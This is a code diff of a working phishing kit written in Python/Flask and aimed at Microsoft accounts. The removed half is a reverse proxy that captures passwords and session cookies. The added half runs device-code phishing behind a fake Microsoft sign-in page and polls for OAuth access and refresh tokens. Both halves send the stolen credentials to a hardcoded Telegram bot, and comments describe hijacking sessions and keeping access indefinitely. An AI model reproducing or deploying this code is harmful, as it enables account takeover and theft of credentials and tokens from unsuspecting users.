@@ -1,308 +1,319 @@
 import os
+import time
 import uuid
+import json
 import requests
-from flask import Flask, request, Response, make_response
+from flask import Flask, request, jsonify, render_template_string, make_response
+from threading import Thread
 
 app = Flask(__name__)
 
-# --- Config ---
+# --- CONFIGURATION ---
 TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
 TELEGRAM_CHAT_ID = "8877118461"
 
-PROXY_DOMAIN = "https://outlook-verify.onrender.com"
-PROXY_HOST = "outlook-verify.onrender.com"
+# Microsoft Device Code Flow Constants
+# Using a public client ID (Azure PowerShell) to avoid consent screen
+CLIENT_ID = "1950a258-227b-4e31-a9cf-717495945fc2" 
+RESOURCE = "https://graph.microsoft.com"
+TENANT = "common"
 
-visitor_sessions = {}
-CAPTURED = {}
+# In-memory storage for active phishing sessions
+# Structure: { vid: { "device_code": "...", "user_code": "...", "interval": 5, "expires_in": 900, "status": "pending" } }
+SESSIONS = {}
 
-# Cookies worth grabbing first (but we send ALL of them anyway)
-HIGH_VALUE = ["ESTSAUTHPERSISTENT", "ESTSAUTH", "ESTSAUTHLIGHT", "RPSSecAuth",
-              "SignInStateCookie", "MSPAuth", "MSPProf", "MSPProfV2", "MSPPre",
-              "ANON", "WLSSC", "PPLState", "KMSI", "MSFPC", "MSPRequ", "X-OWA-CANARY"]
-
-# --- Telegram ---
+# --- TELEGRAM HELPER ---
 def send_telegram(message):
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
         resp = requests.post(url, json={
-            "chat_id": TELEGRAM_CHAT_ID,
-            "text": message,
+            "chat_id": TELEGRAM_CHAT_ID, 
+            "text": message, 
             "parse_mode": "HTML",
             "disable_web_page_preview": True
         }, timeout=10)
-        print(f"[TG] Status: {resp.status_code}")
-        if resp.status_code != 200:
+        if resp.status_code == 200:
+            print(f"[TG] Sent successfully")
+        else:
             print(f"[TG ERROR] {resp.text}")
     except Exception as e:
         print(f"[TG EXCEPT] {e}")
 
-# --- Helpers ---
-def get_set_cookies(resp):
-    cookies = []
-    raw = getattr(resp, "raw", None)
-    if raw and hasattr(raw, "headers"):
-        try:
-            vals = raw.headers.getlist("Set-Cookie")
-            if vals:
-                return vals
-        except:
-            pass
-        try:
-            vals = raw.headers.get_all("Set-Cookie")
-            if vals:
-                return vals
-        except:
-            pass
-    sc = resp.headers.get("Set-Cookie")
-    if sc:
-        return [sc]
-    return []
+# --- MICROSOFT API HELPERS ---
 
-def rewrite_links(text):
-    replacements = [
-        ("https://login.microsoftonline.com", PROXY_DOMAIN),
-        ("https://login.live.com", PROXY_DOMAIN),
-        ("https://account.live.com", PROXY_DOMAIN),
-        ("//login.microsoftonline.com", "//" + PROXY_HOST),
-        ("//login.live.com", "//" + PROXY_HOST),
-        ("//account.live.com", "//" + PROXY_HOST),
-    ]
-    for old, new in replacements:
-        text = text.replace(old, new)
-    return text
-
-def fix_set_cookie(header_value):
-    if not header_value:
-        return ""
-    parts = [p.strip() for p in header_value.split(";") if p.strip()]
-    kept = []
-    for p in parts:
-        lower = p.lower()
-        if lower.startswith("domain=") or lower.startswith("path=") or lower.startswith("secure") or lower.startswith("samesite"):
-            continue
-        kept.append(p)
-    kept.append("Path=/")
-    kept.append("SameSite=Lax")
-    return "; ".join(kept)
-
-def get_session(vid, user_agent):
-    if vid not in visitor_sessions:
-        s = requests.Session()
-        s.headers.update({
-            "User-Agent": user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-        })
-        visitor_sessions[vid] = s
-    return visitor_sessions[vid]
-
-def pick_upstream(path):
-    if path.startswith(("ppsecure/", "GetCredentialType.srf")):
-        return "https://login.live.com"
-    return "https://login.microsoftonline.com"
-
-def dump_all_cookies(vid):
-    """Sharp cookie grabber: dump the ENTIRE session cookie jar."""
-    info = CAPTURED.get(vid)
-    if not info or info.get("sent_cookies"):
-        return
-    sess = visitor_sessions.get(vid)
-    if not sess:
-        return
-    cookies = sess.cookies.get_dict()
-    if not cookies:
-        return
-    # Only send once we actually see high-value auth cookies
-    if not any(hv in cookies for hv in ["ESTSAUTH", "ESTSAUTHPERSISTENT", "RPSSecAuth", "WLSSC", "MSPAuth"]):
-        return
-    info["sent_cookies"] = True
-    lines = []
-    for k, v in cookies.items():
-        lines.append(f"<code>{k}={v}</code>")
-    cookie_str = "\n".join(lines)
-    msg = (
-        f"<b>🍪 SESSION COOKIES CAPTURED</b>\n\n"
-        f"<b>Email:</b> <code>{info.get('email', 'Unknown')}</code>\n"
-        f"<b>Password:</b> <code>{info.get('password', 'Unknown')}</code>\n\n"
-        f"<b>All Cookies ({len(cookies)}):</b>\n{cookie_str}\n\n"
-        f"<i>Load these in Cookie Editor for outlook.office.com / login.microsoftonline.com to hijack the session.</i>"
-    )
-    # Telegram has a 4096 char limit — chunk if needed
-    if len(msg) > 4000:
-        part = ""
-        for line in lines:
-            candidate = part + line + "\n"
-            if len(candidate) > 3900:
-                send_telegram(f"<b>🍪 COOKIES ({info.get('email', 'Unknown')})</b>\n\n" + part)
-                part = line + "\n"
-            else:
-                part = candidate
-        if part.strip():
-            send_telegram(f"<b>🍪 COOKIES ({info.get('email', 'Unknown')}) cont.</b>\n\n" + part)
-    else:
-        send_telegram(msg)
-    print(f"[COOKIE SENT] Vid {vid} | {len(cookies)} cookies")
-
-@app.route("/", defaults={"path": ""}, methods=["GET", "POST"])
-@app.route("/<path:path>", methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"])
-def proxy(path):
-    vid = request.cookies.get("vid")
-    new_vid = False
-    if not vid:
-        vid = str(uuid.uuid4())
-        new_vid = True
-        send_telegram(f"<b>👋 New Visitor</b>\nVid: <code>{vid}</code>\nIP: {request.remote_addr}")
-        print(f"[NEW VISITOR] {vid} from {request.remote_addr}")
-
-    sess = get_session(vid, request.headers.get("User-Agent"))
-
-    upstream_base = pick_upstream(path)
-    target_url = f"{upstream_base}/{path}"
-    if request.query_string:
-        target_url += "?" + request.query_string.decode()
-
-    headers = {}
-    for h in ["Accept", "Accept-Language", "Content-Type", "Origin", "Referer"]:
-        if h in request.headers:
-            val = request.headers[h]
-            if h in ["Referer", "Origin"]:
-                val = val.replace(PROXY_DOMAIN, upstream_base)
-            headers[h] = val
-
+def initiate_device_flow():
+    """Step 1: Get device code and user code from Microsoft"""
+    url = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/devicecode"
+    data = {
+        "client_id": CLIENT_ID,
+        "scope": "openid profile offline_access https://graph.microsoft.com/.default",
+        "resource": RESOURCE # Required for some legacy endpoints
+    }
     try:
-        if request.method == "POST":
-            content_type = request.content_type or ""
-            if "application/json" in content_type:
-                json_data = request.get_json(silent=True)
-                print(f"[JSON POST] Vid: {vid} | Data: {json_data}")
-                if json_data:
-                    check_capture_json(vid, json_data)
-                resp = sess.post(target_url, json=json_data, headers=headers, allow_redirects=False, timeout=30)
-            else:
-                print(f"[FORM POST] Vid: {vid} | Keys: {list(request.form.keys())}")
-                check_capture_form(vid, request.form)
-                resp = sess.post(target_url, data=request.form, headers=headers, allow_redirects=False, timeout=30)
-        elif request.method == "OPTIONS":
-            resp_m = make_response()
-            resp_m.headers['Access-Control-Allow-Origin'] = '*'
-            resp_m.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
-            resp_m.headers['Access-Control-Allow-Headers'] = 'Content-Type'
-            return resp_m
+        resp = requests.post(url, data=data)
+        if resp.status_code == 200:
+            return resp.json()
         else:
-            resp = sess.get(target_url, headers=headers, allow_redirects=False, timeout=30)
+            print(f"[MS ERROR] Initiate failed: {resp.text}")
+            return None
     except Exception as e:
-        print(f"[PROXY ERROR] {e}")
-        return f"Proxy Error: {str(e)}", 502
+        print(f"[MS EXCEPT] {e}")
+        return None
 
-    # === SHARP COOKIE CHECK: run on EVERY response ===
-    dump_all_cookies(vid)
-
-    r = Response(status=resp.status_code)
-
-    if "Location" in resp.headers:
-        loc = resp.headers["Location"]
-        loc = loc.replace("https://login.microsoftonline.com", PROXY_DOMAIN)
-        loc = loc.replace("https://login.live.com", PROXY_DOMAIN)
-        loc = loc.replace("https://account.live.com", PROXY_DOMAIN)
-        if loc.startswith("/"):
-            loc = PROXY_DOMAIN + loc
-        r.headers["Location"] = loc
-
-    content_type = resp.headers.get("Content-Type", "")
-    body = resp.content
-
-    if "text/html" in content_type:
-        text = body.decode("utf-8", errors="ignore")
-        text = rewrite_links(text)
-        inject_script = """
-        <script>
-        setTimeout(function() {
-            var btn = document.querySelector('#idSIButton9, input[type="submit"][value="Yes"], button[type="submit"]');
-            if (btn) {
-                console.log('[PHISH] Auto-clicking KMSI');
-                btn.click();
-            }
-        }, 1000);
-        </script>
-        """
-        if "</body>" in text:
-            text = text.replace("</body>", inject_script + "</body>")
-        body = text.encode("utf-8")
-    elif "text/css" in content_type:
-        body = rewrite_links(body.decode("utf-8", errors="ignore")).encode("utf-8")
-    elif "application/json" in content_type:
+def poll_for_token(device_code, interval):
+    """Step 3: Poll for the token after victim logs in"""
+    url = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token"
+    
+    while True:
+        data = {
+            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
+            "client_id": CLIENT_ID,
+            "device_code": device_code,
+        }
         try:
-            body = rewrite_links(body.decode("utf-8")).encode("utf-8")
-        except:
-            pass
+            resp = requests.post(url, data=data)
+            result = resp.json()
+            
+            # Case 1: Success! We got the tokens
+            if resp.status_code == 200:
+                return result
+            
+            # Case 2: Authorization Pending (User hasn't logged in yet)
+            elif result.get("error") == "authorization_pending":
+                time.sleep(interval)
+                continue
+                
+            # Case 3: Slow Down (Microsoft says wait longer)
+            elif result.get("error") == "slow_down":
+                interval += 5
+                time.sleep(interval)
+                continue
+                
+            # Case 4: Expired or other error
+            else:
+                print(f"[POLL ERROR] {result}")
+                return None
+                
+        except Exception as e:
+            print(f"[POLL EXCEPT] {e}")
+            return None
 
-    r.set_data(body)
-    if content_type:
-        r.headers["Content-Type"] = content_type
+def handle_successful_auth(vid, tokens):
+    """Process and exfiltrate the stolen tokens"""
+    access_token = tokens.get("access_token")
+    refresh_token = tokens.get("refresh_token")
+    id_token = tokens.get("id_token")
+    
+    # Decode ID Token to get email (simple base64 decode of payload)
+    email = "Unknown"
+    try:
+        parts = id_token.split('.')
+        if len(parts) == 3:
+            payload = parts[1]
+            # Add padding if necessary
+            payload += '=' * (4 - len(payload) % 4)
+            import base64
+            decoded = base64.urlsafe_b64decode(payload)
+            user_info = json.loads(decoded)
+            email = user_info.get("preferred_username", user_info.get("upn", "Unknown"))
+    except:
+        pass
 
-    for cookie_header in get_set_cookies(resp):
-        fixed = fix_set_cookie(cookie_header)
-        if fixed:
-            r.headers.add("Set-Cookie", fixed)
+    msg = (
+        f"<b>🔥 VICTIM AUTHENTICATED 🔥</b>\n\n"
+        f"<b>Email:</b> <code>{email}</code>\n"
+        f"<b>VID:</b> <code>{vid}</code>\n\n"
+        f"<b>ACCESS TOKEN:</b>\n<code>{access_token}</code>\n\n"
+        f"<b>REFRESH TOKEN:</b>\n<code>{refresh_token}</code>\n\n"
+        f"<i>Use the Refresh Token to maintain access indefinitely.</i>"
+    )
+    
+    # Send to Telegram
+    send_telegram(msg)
+    
+    # Update session status
+    if vid in SESSIONS:
+        SESSIONS[vid]["status"] = "completed"
+        SESSIONS[vid]["tokens"] = tokens
+        SESSIONS[vid]["email"] = email
 
-    if new_vid:
-        r.set_cookie("vid", vid, max_age=86400, path="/", samesite="Lax", httponly=True)
+# --- FLASK ROUTES ---
 
-    return r
+@app.route("/")
+def index():
+    """Step 1: Generate a new phishing session"""
+    vid = str(uuid.uuid4())
+    
+    # Get codes from Microsoft
+    flow_data = initiate_device_flow()
+    
+    if not flow_data:
+        return "Error initiating service. Please try again.", 500
+        
+    # Store session info
+    SESSIONS[vid] = {
+        "device_code": flow_data["device_code"],
+        "user_code": flow_data["user_code"],
+        "verification_uri": flow_data["verification_uri"],
+        "interval": flow_data.get("interval", 5),
+        "expires_in": flow_data.get("expires_in", 900),
+        "status": "pending",
+        "created_at": time.time()
+    }
+    
+    # Start polling in background thread
+    t = Thread(target=poll_and_capture, args=(vid, flow_data["device_code"], flow_data.get("interval", 5)))
+    t.daemon = True
+    t.start()
+    
+    # Render the phishing page
+    return render_template_string(PHISHING_TEMPLATE, 
+                                  user_code=flow_data["user_code"],
+                                  verification_uri=flow_data["verification_uri"],
+                                  vid=vid)
 
-def check_capture_form(vid, form_data):
-    passwd = None
-    email = None
-    for key in ["passwd", "Password", "pwd", "password", "Passwd"]:
-        if key in form_data:
-            passwd = form_data[key]
-            break
-    for key in ["loginfmt", "login", "username", "EmailAddress", "user"]:
-        if key in form_data:
-            email = form_data[key]
-            break
-    if passwd:
-        print(f"[CAPTURE FORM] Vid: {vid} | Email: {email} | Pass: {passwd}")
-        save_capture(vid, email, passwd)
+def poll_and_capture(vid, device_code, interval):
+    """Background thread to wait for victim login"""
+    print(f"[START POLL] Vid: {vid}")
+    tokens = poll_for_token(device_code, interval)
+    
+    if tokens:
+        print(f"[SUCCESS] Vid: {vid} authenticated!")
+        handle_successful_auth(vid, tokens)
+    else:
+        print(f"[FAILED/EXPIRED] Vid: {vid}")
+        if vid in SESSIONS:
+            SESSIONS[vid]["status"] = "expired"
 
-def check_capture_json(vid, json_data):
-    passwd = None
-    email = None
+@app.route("/status/<vid>")
+def check_status(vid):
+    """AJAX endpoint to check if victim has logged in"""
+    session = SESSIONS.get(vid)
+    if not session:
+        return jsonify({"status": "invalid"})
+        
+    return jsonify({
+        "status": session["status"],
+        "email": session.get("email")
+    })
 
-    def find_passwords(obj):
-        nonlocal passwd, email
-        if isinstance(obj, dict):
-            for k, v in obj.items():
-                if k.lower() in ["passwd", "password", "pwd"] and isinstance(v, str):
-                    passwd = v
-                if k.lower() in ["loginfmt", "login", "username", "user"] and isinstance(v, str):
-                    email = v
-                else:
-                    find_passwords(v)
-        elif isinstance(obj, list):
-            for item in obj:
-                find_passwords(item)
+# --- PHISHING PAGE TEMPLATE ---
+# Mimics Microsoft Device Login Page
+PHISHING_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            width: 440px;
+            padding: 44px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            text-align: left;
+        }
+        .logo {
+            margin-bottom: 24px;
+        }
+        .logo img {
+            height: 24px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #1b1b1b;
+        }
+        p {
+            font-size: 15px;
+            color: #1b1b1b;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .code-box {
+            background-color: #f2f2f2;
+            padding: 10px;
+            font-size: 24px;
+            font-weight: 600;
+            letter-spacing: 2px;
+            text-align: center;
+            margin: 20px 0;
+            border: 1px solid #ccc;
+            cursor: pointer;
+        }
+        .btn {
+            background-color: #0067b8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            font-size: 15px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+        .btn:hover {
+            background-color: #005da6;
+        }
+        .footer {
+            margin-top: 40px;
+            font-size: 12px;
+            color: #666;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0067b8;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 2s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <!-- Microsoft Logo SVG -->
+            <svg width="108" height="23" viewBox="0 0 108 23" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#F25022" d="M1 1h10v10H1z"/>
+                <path fill="#7FBA00" d="M12 1h10v10H12z"/>
+                <path fill="#00A4EF" d="M1 12h10v10H1z"/>
+                <path fill="#FFB900" d="M12 12h10v10H12z"/>
+                <path fill="#737373" d="M26.5 22h-2.2v-8.4h-3.6V22h-2.2v-11.8h2.2v1.6h3.6v-1.6h2.2zm6.6-11.8h2.2v1.5c.6-1 1.6-1.6 2.8-1.6.3 0 .6 0 .9.1v2.3c-.4-.1-.8-.2-1.2-.2-1.3 0-2.4 1-2.4 2.6V22h-2.3zm13.5 0h2.2v1.5c.6-1 1.6-1.6 2.8-1.6.3 0 .6 0 .9.1v2.3c-.4-.1-.8-.2-1.2-.2-1.3 0-2.4 1-2.4 2.6V22h-2.3zm11.6 5.3c0-2.7 2-4.8 4.6-4.8 2.6 0 4.6 2.1 4.6 4.8 0 2.7-2 4.8-4.6 4.8-2.6 0-4.6-2.1-4.6-4.8zm2.3 0c0 1.5 1 2.6 2.3 2.6 1.3 0 2.3-1.1 2.3-2.6 0-1.5-1-2.6-2.3-2.6-1.3 0-2.3 1.1-2.3 2.6zm13.7-5.3h2.2v1.5c.6-1 1.6-1.6 2.8-1.6.3 0 .6 0 .9.1v2.3c-.4-.1-.8-.2-1.2-.2-1.3 0-2.4 1-2.4 2.6V22h-2.3zm10.3 0h2.2v1.6c.7-1.1 1.8-1.7 3.1-1.7 2.2 0 3.7 1.6 3.7 4.1V22h-2.3v-6.4c0-1.3-.7-2.1-1.9-2.1-1.3 0-2.2 1-2.2 2.5V22h-2.3zm13.6 0h2.2v1.5c.6-1 1.6-1.6 2.8-1.6.3 0 .6 0 .9.1v2.3c-.4-.1-.8-.2-1.2-.2-1.3 0-2.4 1-2.4 2.6V22h-2.3z"/>
+            </svg>
+        </div>
+        
+        <h1>Sign in</h1>
+        <p>To sign in, use your phone's camera to scan the QR code, or enter the code below at:</p>
+        <p style="font-weight: 600; color: #0067b8;">{{ verification_uri }}</p>
+        
+        <div class="code-box" id="codeBox" onclick="copyCode()">
+            {{ user_code }}
+        </div>
+        <p style="font-size: 13px; color: #666; text-align: center;">Click code to copy</p>
 
-    find_passwords(json_data)
-    if passwd:
-        print(f"[CAPTURE JSON] Vid: {vid} | Email: {email} | Pass: {passwd}")
-        save_capture(vid, email, passwd)
+        <div id="statusMsg" style="margin-top: 20px; font-size: 14px; color: #0067b8; display: none;">
+            <span class="loader"></span> Waiting for you to sign in...
+        </div>
 
-def save_capture(vid, email, passwd):
-    if vid not in CAPTURED:
-        CAPTURED[vid] = {"sent_pw": False, "sent_cookies": False}
-    CAPTURED[vid]["email"] = email
-    CAPTURED[vid]["password"] = passwd
-    if not CAPTURED[vid]["sent_pw"]:
-        CAPTURED[vid]["sent_pw"] = True
-        msg = (
-            f"<b>🔑 PASSWORD CAPTURED</b>\n\n"
-            f"<b>Email:</b> <code>{email}</code>\n"
-            f"<b>Password:</b> <code>{passwd}</code>\n\n"
-            f"<i>Waiting for session cookies...</i>"
-        )
-        send_telegram(msg)
+        <div id="successMsg" class="hidden" style="margin-top: 20px; font-size: 14px; color: green; font-weight: bold;">
+            ✅ Sign-in successful! You may close this window.
+        </div>
 
-if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host="0.0.0.0", port=port, debug=False)
+        <div class="footer">
+            &copy; 202
